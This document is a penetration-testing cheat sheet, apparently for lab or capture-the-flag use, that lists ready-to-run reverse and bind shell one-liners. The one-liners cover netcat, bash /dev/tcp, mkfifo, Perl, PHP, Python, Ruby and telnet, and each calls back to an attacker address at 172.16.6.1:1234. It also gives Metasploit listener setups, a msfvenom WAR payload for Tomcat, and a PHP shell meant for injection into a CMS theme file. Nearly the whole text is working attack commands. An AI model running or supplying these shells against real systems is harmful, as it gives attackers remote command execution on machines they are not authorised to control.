### Reverse Shells
#### Listensers
```
nc -nlvp 1234
```
- Always set up a netcat listener before executing a bash reverse shell

-You can also use multi handler from metasploit to catch incoming reverse shells
```
msfconsole
use exploit /multi/handler
set LHOST 172.16.6.1
set LPORT 1234
run
```
#### Netcat Reverse Shell
```
nc 172.16.6.1 1234 -e /bin/sh
```
- Standard netcat reverse shell (only works with some versions of nc)

#### Bash Reverse Shells
```
bash -i >& /dev/tcp/172.16.6.1/1234 0>&1
```
- Basic bash reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.1 1234 >/tmp/f
```
- Another bash reverse shell

#### Perl Reverse Shell
```
perl -e 'use Socket;$i="172.16.6.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP Reverse Shell
```
php -r '$sock=fsockopen("172.16.6.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Standard PHP reverse shell typically used for injection on the terminal enviroment or into a web application
```
$sock=fsockopen("172.16.6.1", 1234);exec("/bin/sh -i <&3 >&3 2>&3");
```
- This php shell is used when you can inject php code into a theme file of a CMS (think wordpress)

#### Python Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.6.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- Standard python reverse shell

#### Ruby Reverse Shell
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
- Linux ruby reverse shell
```
ruby -rsocket -e 'c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
- Windows ruby reverse shell

#### War Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.6.1 LPORT=1234 -f war > /home/kali/Documents/shell.war
```
- This will generate a war file for upload on the Tomcat CMS. Once uploaded click on the shell option to activate it.
- Catch this shell with multi/handler
```
msfconsole
use exploit /multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.16.6.1
set LPORT 1234
run
```

#### Reverse shell over the Telnet Protocol
```
mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a
```
- This reverse shell makes a special character file (mknod) uses telnet to call back and direct standard output to the character file via the binary /bin/sh

### Bind Shells
#### Netcat Bind Shell
```
nc -nlvp 1234 -e /bin/sh
```
- This is executed on the target box and waits for an incoming connection
```
nc [target box ip] 1234
```
- This is executed on your attack box to connect to the listener on the target




